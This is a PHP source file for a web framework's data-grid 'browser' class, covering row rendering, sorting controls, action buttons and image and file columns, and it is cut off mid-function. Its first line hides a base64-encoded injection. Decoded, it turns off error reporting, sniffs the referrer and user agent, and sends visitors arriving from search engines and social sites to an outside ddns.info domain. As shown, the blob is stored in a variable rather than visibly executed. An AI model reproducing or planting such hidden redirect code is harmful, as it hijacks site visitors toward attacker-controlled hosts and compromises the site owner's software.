<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));

require_once(dirname(__FILE__).'/custom_browser.php');
require_once(dirname(dirname(__FILE__)).'/jsox/jsox.php');
                           
define('TREE_BROWSER_NODE_STATE_STORAGE', '2AD1D432-73D3-4975-8881-70211F49C0FA');
                           
class browser extends custom_browser {

  var $headers         = array();
  var $columns         = array();
  var $summary         = array();

  var $is_selector = false;
  
  // custom class for row over event
  var $row_over_class = null;
  
  var $scroll_mode = BROWSER_SCROLL_SESSION_POINTER;
  
  var $empty_dataset_label = 'Dataset is empty';
  var $__group_values = array();
  
  // value of first key in grid
  var $first_key;
  var $first_row;
  
  var $persistent_record_pointer = false;
  
  var $__record_selection_scheduled = false;
  
  // tree mode
  var $work_mode = 'list';
  var $tree_level = 0;
  var $root_sql;
  var $sub_sql;
  var $hierarchy_column = 'name';
  var $parent_field = 'parent_id';
  var $auto_remove_childs = true;
  var $expand_icon = 'small';
  var $items_limit     = 0;
  var $manual_items_limit     = false;
  
  var $editable_columns = 0;
  var $sizeable_columns = false;
  var $ajax_method_save_value = '';
  var $record_hint_proc_prefix = '';
  var $record_details_position = 'right';

  function render_body() {

    if ($this->sizeable_columns) {
      $this->insert(new style_href(SHARED_SCRIPTS_URL."jquery.kiketable.colsizable.css"));
      $this->insert(new script_href(SHARED_SCRIPTS_URL."jquery.event.drag.js"));
      $this->insert(new script_href(SHARED_SCRIPTS_URL."jquery.kiketable.colsizable.js"));
    }
    
    if ($this->editable_columns)
      $this->insert(new script_href(SHARED_SCRIPTS_URL."jquery.editable.js"));

    $grid_table = new table(array( 'width'       => $this->width
                                 , 'cellspacing' => 1
                                 , 'class'       => 'brw_grid'
                                 , 'gcl'         => get_class($this)
                                 , 'ghp'         => $this->record_hint_proc_prefix
                                 ));

    if ($this->visible('header')) 
      $this->render_header(&$grid_table);

    $this->do_before_render_grid(&$grid_table);
    $this->render_grid_by_sql(&$grid_table, $this->sql());
    $this->do_after_render_grid(&$grid_table);

    if ($this->visible('header') and $this->visible('footer')) {
      $this->render_footer(&$grid_table);
      $this->do_after_render_footer(&$grid_table);
    }
                    
    if ($this->capable("record_details")) {
      switch ($this->record_details_position) {
        case "right":
          $this->add(new table( array( 'width'       => $this->width
                                     , 'cellspacing' => 1)
                              , new table_row( array('valign' => 'top')
                                             , new table_cell( $grid_table
                                                             , array('width' => '100%')
                                                             )
                                             , new table_cell( new html_div(array( 'class' => 'record_details_panel'
                                                                                 , 'style' => 'display:none;'.$this->capability_option('record_details', 'style')
                                                                                 , 'id'    => $this->context_id('record_details')))
                                                             ))));
          break;
        case "bottom":
          $this->add($grid_table);
          $this->add( new html_div(array( 'class' => 'record_details_row'
                                        , 'style' => 'display:none;'.$this->capability_option('record_details', 'style')
                                        , 'id'    => $this->context_id('record_details')))
                                        );
          break;
      }
    } else {
      $this->add($grid_table);
    }

    if ($this->sizeable_columns) {
      $this->add(new script('$(".brw_grid").kiketable_colsizable({fixWidth:true, dragMove:false, dragCells:"tr:first>*:not(:first):not(:last)"});'));
    }
    
    if (!$this->__record_selection_scheduled) {
      if ($this->first_key and $this->capable("record_details")) {
        global $jsox;
        $get_details = $jsox->generate_call( array( "method"     => "get_record_details"
                                                  , "callback"   => "show_record_details"
                                                  , "identifier" => $this->first_key
                                                  , "quote"      => "'"
                                                  )
                                           , get_class($this)
                                           , $this->first_key
                                           , $this->context_id('record_details')
                                           );
        if ($onselectrow = $this->get_on_select_row_script($this->first_row?$this->first_row:array($this->key_field => $this->first_key))) {
          $get_details .= ';'.$onselectrow;
        }
        $this->add(new script('window.setTimeout("'.$get_details.'", 1);'));
      } else
      if ($this->first_row and ($onselectrow = $this->get_on_select_row_script($this->first_row))) {
        $this->add(new script('window.setTimeout("'.$onselectrow.'", 1);'));
      } 
    }
      
    if (!$this->capable('strip_rows') and !$this->is_print_mode())
      $this->add(new script('interactiveGrids.AddRowPrefix("'.$this->context_id("row".__HTML_CONTROL_NAME_SEPARATOR).'");'));
                                               
    if (!$this->rows_rendered) {
      $this->add(new html_br());
      $this->add(new html_center(trn($this->empty_dataset_label)));
    }
      
  }    
  
  function render_grid_by_sql($grid_table, $sql) {

    global $db;

    $query = $db->query($sql);
    $this->field_defs = $db->field_defs($query);
    $rows_amount = 0;
    if ($this->items_limit && $this->manual_items_limit && ($this->pager->current_page > 1)) {
      while ($row = $db->next_row($query)) {
        if ($this->can_render_row($row)) {
          $rows_amount++;
        }
        if ($rows_amount == ($this->pager->current_page - 1) * $this->pager->current_page_size) {
          break;
        }
      }
    }
    while ($row = $db->next_row($query)) {
      if ($this->can_render_row($row)) {
        $this->do_before_render_row(&$grid_table, $row);
        $this->render_row(&$grid_table, $row, $this->field_defs, $this->rows_rendered);
        $this->render_tree_nodes(&$grid_table, $row);
        $this->do_after_render_row(&$grid_table, $row);
        $this->rows_rendered++;
      }
      if ($this->items_limit && $this->manual_items_limit && (($this->rows_rendered == $this->pager->page_size) || (($this->rows_rendered + $rows_amount) == $this->items_limit))) {
        break;
      }
    }

  }

  function can_render_row($row) {
  
    return true;
    
  }
  
  function render_order_control($container, $column) {
    
    $order = $this->order($column['name']);

    $ot = new table(array( 'cellspacing' => 0
                         , 'class'       => 'order'
                         ));

    $otr = new table_row();
    if (!$this->is_print_mode())
      $otr->add(new table_header(trn(safe($column, 'header')), array('rowspan' => 2)));
    else  
      $otr->add(new table_header(trn(safe($column, 'header'))));
      
    if ($order == 'ASC') {
      $otr->add( new table_header( ($this->is_print_mode()?null:array('valign' => 'bottom'))
                                 , new image( SHARED_RESOURCES_URL.'img_sort_asc_sorted.gif'
                                            , array( 'alt'   => sprintf(trn('Sorted by field [%s], ascending'), addslashes(safe($column, 'header')))
                                                   )
                                            )
                                 )
               );
    } else
    if (!$this->is_print_mode()) {
      $otr->add( new table_header( array('valign' => 'bottom')
                                 , new image( SHARED_RESOURCES_URL.'img_sort_asc.gif'
                                            , array( 'alt'   => sprintf(trn('Sort by field [%s], ascending'), addslashes(safe($column, 'header')))
                                                   , 'class' => 'brw_order_asc'
                                                   , 'rel'   => $column['name']
                                                   )
                                            )
                                 )
               );
    }

    if ($order && !$this->is_print_mode()) {
      $otr->add( new table_header( array('rowspan' => 2)
                                 , new image( SHARED_RESOURCES_URL.'img_sort_none.gif'
                                            , array( 'alt'   => sprintf(trn('Cancel sorting by field [%s]'), addslashes(safe($column, 'header')))
                                                   , 'class' => 'brw_order_clear'
                                                   , 'rel'   => $column['name']
                                                   )
                                            )
                                 )
               );
    }

    $ot->add($otr); 
    
    if ($order == 'DESC') {
      if ($this->is_print_mode()) {
        $otr->add( new table_header( new image( SHARED_RESOURCES_URL.'img_sort_desc_sorted.gif'
                                              , array( 'alt'   => sprintf(trn('Sorted by field [%s], descending'), addslashes(safe($column, 'header')))
                                                    )
                                              )
                                   )
                 );
      } else {
        $ot->add( new table_row( new table_header( array('valign' => 'top')
                                                 , new image( SHARED_RESOURCES_URL.'img_sort_desc_sorted.gif'
                                                            , array( 'alt'   => sprintf(trn('Sorted by field [%s], descending'), addslashes(safe($column, 'header')))
                                                                   )
                                                            )
                                                 )
                               )
                );
      }
    } else   
    if (!$this->is_print_mode()) {
      $ot->add( new table_row( new table_header( array('valign' => 'top')
                                               , new image( SHARED_RESOURCES_URL.'img_sort_desc.gif'
                                                          , array( 'alt'   => sprintf(trn('Sort by field [%s], descending'), addslashes(safe($column, 'header')))
                                                                 , 'class' => 'brw_order_desc'
                                                                 , 'rel'   => $column['name']
                                                                 )
                                                          )
                                               )
                             )
              );
    }
    
    $container->add($ot);
    
  }

  function render_header($grid_table) {

    global $url;
    global $ui;
    global $auth;

    if (count($this->headers) > 0) {

      $row = new table_row(array("class" => "header"));
      $columns = 0;
      if ($this->capable('select'))
        $columns++;
      if ($this->capable('select_one'))
        $columns++;
      if ($this->capable('view'))
        $columns++;
      if ($this->capable('edit'))
        $columns++;
      if ($this->capable('copy'))
        $columns++;
      if ($this->capable('change_order'))
        $columns += 2;

      if ($columns > 0) {
        $row->add(new table_header(array('colspan' => $columns)));
      }
  
      $values = array();
      foreach($this->headers as $header) {
        $row->add(new table_header( array('colspan' => safe($header, 'colspan'))
                                  , trn(safe($header, 'title'))
                                  ));
      }

      if ($this->capable('delete')) {
        $row->add(new table_header());
      }
        
      $grid_table->add($row);
      

    }

    // Opera bugfix - othrwise headers are not centered
    //$row = new table_row(array('align' => 'center'));
    $row = new table_row(array('align' => 'center', 'class' => 'header'));

    $columns = 0;
    if ($this->capable('select_all')) {
      $row->add(new table_header( array('class'=> 'button')
                                , new html_checkbox(array( 'title'   => trn('Select\Unselect All')
                                                         , 'onclick' => "Browser_DoSelectAll(this, '".$this->id()."');"))));
    } else 
    if ($this->capable('select'))
      $columns++;
    if ($this->capable('select_one'))
      $columns++;
    if ($this->capable('view'))
      $columns++;
    if ($this->capable('edit'))
      $columns++;
    if ($this->capable('copy'))
      $columns++;
    if ($this->capable('login_as_user'))
      $columns++;
    if ($this->capable('login_as_user2'))
      $columns++;
      if ($this->capable('authorize'))
      $columns++;
      
      

    if ($columns > 0)
      $row->add(new table_header(array('colspan' => $columns)));

    foreach($this->columns as $column) {
      
      if ($this->is_column_visible($column)) {
        $cell = new table_header();
        if (($column['name'] == $this->hierarchy_column) && ($this->work_mode == 'tree') && $this->capable('expand_whole_tree')) {
          $cell->add( new html_div(new javascript_image_href( $this->js_post_back('expand_all', $column['name'])
                                                            , SHARED_RESOURCES_URL.'img_expand_tree.gif'
                                                            , array('title' => trn('Expand whole tree'))
                                                            )
                    , array("style"=>"float: left;")));
          $cell->add( new html_div(new javascript_image_href( $this->js_post_back('collapse_all', $column['name'])
                                                            , SHARED_RESOURCES_URL.'img_collapse_tree.gif'
                                                            , array('title' => trn('Collapse whole tree'))
                                                            )
                    , array("style"=>"float: left;")));
        }
        if (safe($column, 'sortable') and ($this->capable('sort'))) {
          $this->render_order_control(&$cell, $column);
        } 
        else {
          $cell->add(new text(trn(safe($column, 'header'))));
        }  

        $row->add($cell);
      }
    }
      
    if ($this->capable('delete') and $this->capable('delete_selected'))
      $row->add(new table_header( array("class" => "button")
                              , new javascript_image_href( $this->js_call('Browser_DoDeleteSelected')
                                                         , SHARED_RESOURCES_URL.'img_delete.gif'
                                                         , array("title" => trn('Delete selected records'))
                                                         )));
    else
    if ($this->capable('delete')) 
      $row->add(new table_header(null, '&nbsp;'));

    $grid_table->add($row);

  }

  function render_row($grid_table, $row, $defs, $num) {

    global $tmpl;
    global $db;
    global $ui;
    global $auth;

    if (!$this->first_key)
      $this->first_key = $row[$this->key_field];
    if (!$this->first_row)
      $this->first_row = $row;
      
    $this->rendered_row = array();
    $this->rendered_row['columns'] = 0;

    if ($this->capable('strip_rows') and ($num % 2 == 0))
      $table_row = new table_row(array('class' => 'selected', 'bgcolor' => '#ACF', 'valign' => 'top'));
    else  
      //if (($this->work_mode == 'tree') && (!$row[$this->parent_field]))
      //  $table_row = new table_row(array('class' => 'root'));
      //else
      $table_row = new table_row(array('valign' => 'top'));

    $table_row->set_id($this->context_id("row".__HTML_CONTROL_NAME_SEPARATOR.$row[$this->key_field]));
      
    if ($this->capable('select')) {
      if ($this->can_select($row))
        $table_row->add(new table_cell( array('class' => 'button')
                                      , new html_checkbox(array('id' => $this->context_id('rec['.$row[$this->key_field].']')))));
      else
        $table_row->add(new table_cell( array('class' => 'button')));
      $this->rendered_row['columns'] = $this->rendered_row['columns'] + 1;
    }

    if ($this->capable('select_one')) {
      if ($this->can_select($row)) {
        $attributes = array('id' => $this->context_id('rec_selected'));
        $on_click = $this->capability_option('select_one', 'on_select');
        if ($on_click)
          $attributes['onclick'] = $on_click;
        $attributes['value'] = $row[$this->key_field];
        $table_row->add(new table_cell( array('class' => 'button')
                                      , new html_radio($attributes)));
      } else
        $table_row->add(new table_cell( array('class' => 'button')));
      $this->rendered_row['columns'] = $this->rendered_row['columns'] + 1;
    }

    if ($this->capable('view')) {
      if ($this->can_view($row)) {
        global $url;       
        global $menu;  
        $view_href = $url->generate_full_url(array( URL_PARAM_ACTION       => 'view'
                                                  , URL_PARAM_KEY          => $db->encrypt_key($this->translate_key_for('view', $row))
                                                  , URL_PARAM_POPUP_WINDOW => 1
                                                  , URL_PARAM_ENTITY       => $this->entity_name_for('view', $row)
                                                  , URL_PARAM_BIND_KEY     => $db->encrypt_key($this->bind_key())
                                                  , URL_PARAM_BIND_ENTITY  => $this->binded_to_class()
                                                  ));
        $href = new javascript_image_href( placeholder(OPEN_POPUP, $view_href)
                                         , SHARED_RESOURCES_URL.'img_view.gif'
                                         , array( 'title' => trn('View') ));
        $table_row->add(new table_cell( array('class' => 'button'), $href));
      } else 
        $table_row->add(new table_cell(array('class' => 'button')));
      $this->rendered_row['columns'] = $this->rendered_row['columns'] + 1;
    }

    if ($this->capable('edit')) {
      if ($this->can_update($row)) {
        global $url;  
        global $menu;  
        $edit_href = $url->generate_full_url(array( URL_PARAM_ACTION       => 'edit'
                                                  , URL_PARAM_KEY          => $db->encrypt_key($this->translate_key_for('edit', $row))
                                                  , URL_PARAM_POPUP_WINDOW => 1
                                                  , URL_PARAM_ENTITY       => $this->entity_name_for('edit', $row)
                                                  , URL_PARAM_BIND_KEY     => $db->encrypt_key($this->bind_key())
                                                  , URL_PARAM_BIND_ENTITY  => $this->binded_to_class()
                                                  ));
        $href = new javascript_image_href( placeholder(OPEN_POPUP, $edit_href)
                                         , SHARED_RESOURCES_URL.'img_edit.gif'
                                         , array( 'title' => trn('Edit') ));
        $table_row->add(new table_cell( array('class' => 'button'), $href));
      } else {
        $table_row->add(new table_cell(array('class' => 'button')));
      }
      $this->rendered_row['columns'] = $this->rendered_row['columns'] + 1;
    }
    
    if ($this->capable('login_as_user')) {
      if ($this->can_update($row)) {
        global $url;  
        global $menu;  
        $edit_href = $url->generate_full_url(array( URL_PARAM_ACTION       => 'login_as_user'
                                                  , URL_PARAM_KEY          => $db->encrypt_key($this->translate_key_for('login_as_user', $row))
                                                  , URL_PARAM_POPUP_WINDOW => 1
                                                  , URL_PARAM_ENTITY       => $this->entity_name_for('login_as_user', $row)
                                                  , URL_PARAM_BIND_KEY     => $db->encrypt_key($this->bind_key())
                                                  , URL_PARAM_BIND_ENTITY  => $this->binded_to_class()
                                                  , URL_PARAM_ID  => $row['id']
                                                  , URL_PARAM_LOGIN  => $row['login']
                                                  , URL_PARAM_USER_TYPE  => 'bidders'
                                                  ));
        $href = new javascript_image_href( placeholder(OPEN_POPUP, $edit_href)
                                         , SHARED_RESOURCES_URL.'whm.gif'
                                         , array( 'title' => trn('login_as_user') ));
        $table_row->add(new table_cell( array('class' => 'button'), $href));
      } else {
        $table_row->add(new table_cell(array('class' => 'button')));
      }
      $this->rendered_row['columns'] = $this->rendered_row['columns'] + 1;
    }
    
    if ($this->capable('login_as_user2')) {
      if ($this->can_update($row)) {
        global $url;  
        global $menu;  
        $edit_href = $url->generate_full_url(array( URL_PARAM_ACTION       => 'login_as_user2'
                                                  , URL_PARAM_KEY          => $db->encrypt_key($this->translate_key_for('login_as_user2', $row))
                                                  , URL_PARAM_POPUP_WINDOW => 1
                                                  , URL_PARAM_ENTITY       => $this->entity_name_for('login_as_user2', $row)
                                                  , URL_PARAM_BIND_KEY     => $db->encrypt_key($this->bind_key())
                                                  , URL_PARAM_BIND_ENTITY  => $this->binded_to_class()
                                                  , URL_PARAM_ID  => $row['id']
                                                  , URL_PARAM_LOGIN  => $row['login']
                                                  , URL_PARAM_USER_TYPE  => 'auctioneers'
                                                  ));
        $href = new javascript_image_href( placeholder(OPEN_POPUP, $edit_href)
                                         , SHARED_RESOURCES_URL.'whm.gif'
                                         , array( 'title' => trn('login_as_user') ));
        $table_row->add(new table_cell( array('class' => 'button'), $href));
      } else {
        $table_row->add(new table_cell(array('class' => 'button')));
      }
      $this->rendered_row['columns'] = $this->rendered_row['columns'] + 1;
    }
    
    if ($this->capable('authorize')) {
      if ($this->can_update($row)) {
        global $url;  
        global $menu;  
        $edit_href = $url->generate_full_url(array( URL_PARAM_ACTION       => 'authorize'
                                                  , URL_PARAM_KEY          => $db->encrypt_key($this->translate_key_for('authorize', $row))
                                                  , URL_PARAM_POPUP_WINDOW => 1
                                                  , URL_PARAM_ENTITY       => $this->entity_name_for('authorize', $row)
                                                  , URL_PARAM_BIND_KEY     => $db->encrypt_key($this->bind_key())
                                                  , URL_PARAM_BIND_ENTITY  => $this->binded_to_class()
                                                  , URL_PARAM_ID  => $row['id']
                                                  , URL_PARAM_TYPE  => 'authorize'
                                                  , URL_PARAM_USER_TYPE  => 'admin'
                                                  ));
        $href = new javascript_image_href( placeholder(OPEN_POPUP, $edit_href)
                                         , SHARED_RESOURCES_URL.'add_comment.gif'
                                         , array( 'title' => trn('authorize') ));
        $table_row->add(new table_cell( array('class' => 'button'), $href));
      } else {
        $table_row->add(new table_cell(array('class' => 'button')));
      }
      $this->rendered_row['columns'] = $this->rendered_row['columns'] + 1;
    }

    $close_popup_refresh  = (get(URL_PARAM_SILENT_CLOSE_POPUP)=='0' ? 'true' : 'false');
    $close_popup_callback = get(URL_PARAM_POPUP_CLOSE_CALLBACK);

    if ($this->is_selector) {                                                                                    
      $table_row->set_attribute('onenterpress', "__ClosePopup(".$close_popup_refresh.", ".$row[$this->key_field].", '".$close_popup_callback."')");
    } else  
    if ($this->capable('post_on_click')) {
      $table_row->set_attribute('onenterpress', $this->js_post_back('brw_click', $row[$this->key_field]));
    } else 
    if ($on_enter = $this->get_on_enter_script($row)) {
      $table_row->set_attribute('onenterpress', $on_enter);
    } else
    if ($this->capable('edit') and $this->can_update($row))
      $table_row->set_attribute('onenterpress', sql_placeholder(OPEN_POPUP, $edit_href));
    else
    if ($this->capable('view') and $this->can_view($row))
      $table_row->set_attribute('onenterpress', sql_placeholder(OPEN_POPUP, $view_href));

    if ($this->capable('copy')) {
      if ($this->can_update($row)) {
        global $url;  
        global $menu;  
        $href = $url->build_full_url(array( URL_PARAM_ACTION       => 'copy'
                                          , URL_PARAM_SOURCE_KEY   => $db->encrypt_key($this->translate_key_for('copy', $row))
                                          , URL_PARAM_POPUP_WINDOW => 1
                                          , URL_PARAM_ENTITY       => $this->entity_name_for('edit', $row)
                                          , URL_PARAM_BIND_KEY     => $db->encrypt_key($this->bind_key())
                                          , URL_PARAM_BIND_ENTITY  => $this->binded_to_class()
                                          ));
        $href = new javascript_image_href( sql_placeholder(OPEN_POPUP, $href)
                                         , SHARED_RESOURCES_URL.'img_copy.gif'
                                         , array( 'title' => trn('Copy') ));
        $table_row->add(new table_cell( array('class' => 'button'), $href));
      } else 
        $table_row->add(new table_cell(array('class' => 'button')));
      $this->rendered_row['columns'] = $this->rendered_row['columns'] + 1;
    }

    foreach($this->columns as $column) {

      if ($this->is_column_visible($column)) {

        $cell = new table_cell();
        
        $column_name = $column['name'];
        
        $type = safe($column, 'type', 'text');
        
        if ($this->is_field_column($column)) 
          $data_type = safe($column, 'data_type', safe(safe($defs, $column_name), 'type', 'text'));
        else  
          $data_type = safe($column, 'data_type', 'text');
        if (safe($column, 'width'))
          $cell->set_attribute('width', $column['width']);
        if (safe($column, 'align'))
          $cell->set_attribute('align', $column['align']);
        if (safe($column, 'vertical_align'))
          $cell->set_attribute('valign', $column['vertical_align']);
        if (safe($column, 'nowrap'))
          $cell->set_attribute('nowrap', true);
        
        switch ($type) {
          case 'yesno':
          case 'yesnoimage':
          case 'checkbox':
            $cell->fill_attribute('class', 'yesno');
            break;
          case 'currency':
            $cell->fill_attribute('class', 'currency');
            break;
          case 'image':
            $cell->fill_attribute('class', 'image');
            break;
          case 'button':
            $cell->fill_attribute('class', 'button');
            break;
        }
        
        switch ($data_type) {
          case 'date':
          case 'date_time':
            $cell->fill_attribute('class', 'date');
            break;
          case 'time':
            $cell->fill_attribute('class', 'time');
            break;
          case 'int':
          case 'real':
          case 'float':
          case 'double':
            if (!(safe($column, 'align') && (safe($column, 'type') == 'custom')))
              $cell->fill_attribute('class', 'number');
            break;
        }   
           
        if ($this->is_field_column($column)) 
          $field_value = $this->field($row, $column_name);
        else
          $field_value = $this->do_fill_field($row, $column_name);

        $this->do_before_render_column(&$cell, $row, $column_name);

        switch ($type) {
          case 'custom':
            $this->do_render_custom_column(&$cell, $row, $column_name);
            break;
          case 'image':
            $file_name = $field_value;
            if ($file_name <> '') {
              switch(safe($column, 'storage_mode')) {
                case "optimal":                                
                  $image_url = optimal_file_storage_path(safe($column, 'url'), safe($column, 'image_table', $this->table), $row[safe($column, 'image_name_field', $this->key_field)], safe($column, 'optimal_storage_field_name', $column_name));
                  $image_folder = optimal_file_storage_path(safe($column, 'folder'), safe($column, 'image_table', $this->table), $row[safe($column, 'image_name_field', $this->key_field)], safe($column, 'optimal_storage_field_name', $column_name));
                  break;
                default:
                  if (safe($column, 'auto_folder')) {
                    $image_url = safe($column, 'url').$this->table.'/'.$row[$this->key_field].'/';
                    $image_folder = safe($column, 'folder').$this->table.'/'.$row[$this->key_field].'/';
                  } else {
                    $image_url = safe($column, 'url');
                    $image_folder = safe($column, 'folder');
                  }
                  break;
              }
              $file_url = $image_url.$file_name;
              $file_folder = $image_folder.$file_name;
              $file_exists = (safe($column, 'folder') && file_exists($file_folder));
              
              $image_attributes = array();
              if (safe($column, "image_width"))
                $image_attributes["width"] = $column["image_width"];
              if (safe($column, "image_height"))
                $image_attributes["height"] = $column["image_height"];
              if (!safe($column, "image_width") && !safe($column, "image_height") && $file_exists) {
                require_once(dirname(dirname(__FILE__))."/utils/image_file.php");
                $image_file = new image_file($file_folder);
                if ($image_file->valid) { 
                  if ($image_file->width() > safe($column, "max_image_width", BROWSER_MAX_IMAGE_WIDTH)) {
                    $image_attributes["width"]  = safe($column, "max_image_width", BROWSER_MAX_IMAGE_WIDTH);
                    $image_attributes["height"] = round($image_file->height() * ($image_attributes["width"] * 100 / $image_file->width()) / 100);
                  } 
                }                                 
              }
              
              if (!safe($column, 'folder') || file_exists($file_folder)) {
                $cell->add(new image($file_url, $image_attributes));
              }
            }
            break;
          case 'file':
            $file_name = $field_value;
            if ($file_name <> '') {           
              switch(safe($column, 'storage_mode')) {
                case "optimal":                                
                  $folder = optimal_file_storage_path(safe($column, 'url'), $this->table, $row[$this->key_field], safe($column, 'optimal_storage_field_name', $column_name));
                  break;
                default:
                  if (safe($column, 'auto_folder'))
                    $folder = safe($column, 'url').$this->table.'/'.$row[$this->key_field].'/';
                  else
                    $folder = safe($column, 'url');
                  break;
              }
              $file_name = $folder.$file_name;
              $cell->add(new href($file_name, $field_value, array('target' => '_blank')));
            }
            break;
          case 'currency':
            if ($field_value) {
              $decimal_digits = safe($column, 'precision', safe($column, 'decimal_digits', 2));
              $cell->add(new text(safe($column, 'prefix'). 
                                  number_format(round($field_value, $decimal_digits), $decimal_digits).
                                  safe($column, 'postfix')));
            }                      
            break;
          case 'yesno':
          case 'checkbox':
            $cell->add(new html_checkbox(array( 'checked'  => ($field_value == '1')
                                              , 'disabled' => true
                                              )));
            break;
          case 'yesnoimage':
            if($field_value){
                $yesno_img = 'yes.png';
            }else{
                $yesno_img = 'no.png';
            }
            $cell->add(new image(SHARED_RESOURCES_URL.$yesno_img));
            break;
          case 'check_list':
            $cell->add(new db_check_list(array( 'table'             => safe($column, 'check_list_table')
                                              , 'key_field'         => safe($column, 'check_list_table_key_field')
                                              , 'name_field'        => safe($column, 'check_list_table_name_field')
                                              , 'order_field'       => safe($column, 'check_list_table_order_field')
                                              , 'sql'               => safe($column, 'check_list_sql')
                                              , 'link_table'        => safe($column, 'check_list_link_table')
                                              , 'link_pk_field'     => safe($column, 'check_list_link_pk_field')
                                              , 'link_fk_field'     => safe($column, 'check_list_link_fk_field')
                                              , 'key_value'         => $row[safe($column, 'check_list_field', $this->key_field)]
                                              , 'read_only'         => true
                                              , 'group_table'       => safe($column, 'check_list_group_table')
                                              , 'group_field'       => safe($column, 'check_list_group_field')
                                              , 'group_order_field' => safe($column, 'check_list_group_order_field') 
                                              , 'order_field'       => safe($column, 'check_list_order_field')
                                              , 'filter'            => safe($column, 'check_list_filter')
                                              , 'show_groups'       => safe($column, 'check_list_show_groups')
                                              , 'dic_table'         => safe($column, 'check_list_dic_table')
                                              , 'dic_field'         => safe($column, 'check_list_dic_field')
                                              , 'dic_group_field'   => safe($column, 'check_list_dic_group_field')
                                              , 'dic_order_field'   => safe($column, 'check_list_dic_order_field')
                                              , 'group_separator'   => safe($column, 'check_list_group_separator')
                                              , 'item_separator'    => safe($column, 'check_list_item_separator')
                                              )));
            break;
          case 'html':
            $cell->add(new text($field_value));
            break;
          case 'rtf':
            $cell->add(new text($field_value));
            break;  
          case 'button':
            if ($this->can_button($row, $column['name'])) {
              $this->do_config_button(&$column, $row);
              $attributes = array();
              //if (safe($column, 'hint'))
              //  $attributes["title"]  = safe($column, 'title')."] body=[".safe($column, 'hint')."]";
              //else
              $attributes["title"]  = safe($column, 'title');

              switch ($column['action']) {
                case 'post_back':
                  $event_name = $column['post_back_event_name'];
                  $event_value = safe($column, 'post_back_event_value');
                  if (!$event_value || ($event_value == PLACEHOLDER_KEY))
                    $event_value = $row[$this->key_field];
                  else
                  if (array_key_exists($event_value, $row))
                    $event_value = $row[$event_value];
                  $confirmation = safe($column, 'post_back_confirmation');
                  $reason_query = safe($column, 'post_back_reason_query');
                  if ($reason_query)
                    $href = $this->js_post_back_with_reason($event_name, $event_value, $reason_query);
                  else  
                    $href = $this->js_post_back($event_name, $event_value, $confirmation);
                  if (safe($column, 'image')) {
                    $cell->add(new javascript_image_href( $href
                                                        , (safe($column, 'shared_image')?SHARED_RESOURCES_URL:(safe($column, 'resources_url')?safe($column, 'resources_url'):RESOURCES_URL)).$column['image']
                                                        , $attributes));
                  } else {
                    $attributes['onclick'] = $href;
                    $attributes['value']   = safe($column, 'title');
                    $cell->add(new button( $attributes));
                  }
                  break;
                case 'popup':
                  $href = $column['href'];
                  $href = str_replace(PLACEHOLDER_KEY_ENC, $db->encrypt_key($row[$this->key_field]), $href);
                  $href = str_replace(PLACEHOLDER_KEY,                      $row[$this->key_field],  $href);
                  if (safe($column, 'image'))
                    $cell->add(new javascript_image_href( placeholder(OPEN_POPUP, $href)
                                                        , (safe($column, 'shared_image')?SHARED_RESOURCES_URL:(safe($column, 'resources_url')?safe($column, 'resources_url'):RESOURCES_URL)).$column['image']
                                                        , $attributes));
                  break;
                case 'javascript':
                  $href = $column['href'];
                  $href = str_replace(PLACEHOLDER_KEY_ENC, $db->encrypt_key($row[$this->key_field]), $href);
                  $href = str_replace(PLACEHOLDER_KEY,                      $row[$this->key_field],  $href);
                  if (safe($column, 'image'))
                    $cell->add(new javascript_image_href( $href
                                                        , (safe($column, 'shared_image')?SHARED_RESOURCES_URL:(safe($column, 'resources_url')?safe($column, 'resources_url'):RESOURCES_URL)).$column['image']
                                                        , $attributes));                                                        
                  break;
                case 'redirect':
                  $href = $column['href'];
                  $href = str_replace(PLACEHOLDER_KEY_ENC, $db->encrypt_key($row[$this->key_field]), $href);
                  $href = str_replace(PLACEHOLDER_KEY,                      $row[$this->key_field],  $href);
                  if (safe($column, 'image'))
                    $cell->add(new image_href( $href
                                             , (safe($column, 'shared_image')?SHARED_RESOURCES_URL:(safe($column, 'resources_url')?safe($column, 'resources_url'):RESOURCES_URL)).$column['image']
                                             , $attributes));
                  break;
                case 'open':
                  $href = $column['href'];
                  $href = str_replace(PLACEHOLDER_KEY_ENC, $db->encrypt_key($row[$this->key_field]), $href);
                  $href = str_replace(PLACEHOLDER_KEY,                      $row[$this->key_field],  $href);
                  $attributes["target"] = "_blank";
